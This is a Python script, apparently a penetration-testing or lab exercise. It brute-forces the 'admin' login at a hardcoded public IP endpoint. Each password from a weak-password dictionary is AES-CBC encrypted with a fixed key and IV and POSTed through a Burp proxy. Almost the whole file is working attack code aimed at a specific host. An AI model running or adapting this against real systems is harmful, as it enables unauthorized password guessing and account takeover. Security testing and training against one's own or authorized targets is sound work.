# -*- encoding: utf-8 -*-
# TODO:@ModuleName: 临时
# TODO:@Author: tomato
# TODO:@Version: Python3.12.0
# TODO:@Time: 2025/8/8 16:45
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import requests


def aes_encrypt(origin_data, key, iv):
    """
    AES加密函数
    :param origin_data: 原始数据
    :param key: 密钥
    :param iv: 初始化向量
    """
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(origin_data.encode('utf-8'), AES.block_size)
    encrypt_data = cipher.encrypt(padded_data)
    encrypt_data = base64.b64encode(encrypt_data).decode('utf-8')
    return encrypt_data


def req_api(url, headers, payload):
    """
    发送请求
    :param url: 请求URL
    :param headers: 请求头
    :param payload: 加密后的数据
    """
    data = {'encryptedData': payload}
    # TODO: 配置转发到burp的代理
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    resp = requests.post(url, headers=headers, data=data, proxies=proxies)
    print(resp.text)


if __name__ == '__main__':
    Key = b'1234567890123456'
    Iv = b'1234567890123456'
    Url = 'http://121.43.105.51:82/encrypt/aes.php'
    Headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Origin': 'http://121.43.105.51:82',
        'Referer': 'http://121.43.105.51:82/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    with open("弱口令字典.txt", "r", encoding="utf-8") as f:
        lines = f.readlines()
        for line in lines:
            password = line.strip()
            plaintext = f'{{"username":"admin","password":"{password}"}}'
            Payload = aes_encrypt(plaintext, Key, Iv)
            req_api(Url, Headers, Payload)
